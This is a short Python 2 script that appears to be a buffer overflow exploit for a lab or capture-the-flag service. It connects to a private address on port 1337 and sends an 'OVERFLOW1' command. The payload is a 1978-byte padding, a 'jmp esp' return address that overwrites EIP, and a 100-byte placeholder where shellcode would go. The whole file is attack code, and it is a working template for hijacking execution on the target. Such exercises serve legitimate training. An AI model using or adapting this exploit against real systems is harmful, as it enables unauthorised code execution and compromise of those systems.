#!/usr/bin/python

import sys
import socket, time
from struct import *


remoteip="10.10.59.217"
remoteport=1337
offset= "A"* 1978
# jmp esp 625011AF
eip=pack('<L',0x625011AF)
esp="C"*100
buffer = offset + eip + esp

while True:

    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((remoteip, remoteport))
    except:
        print ("[-] Connection error!")
        sys.exit(1)

    print s.recv(1024)
    s.send("OVERFLOW1 " + buffer + '\r\n')
    print s.recv(1024)
    s.close()
    time.sleep(1)
    print "-------------------------"
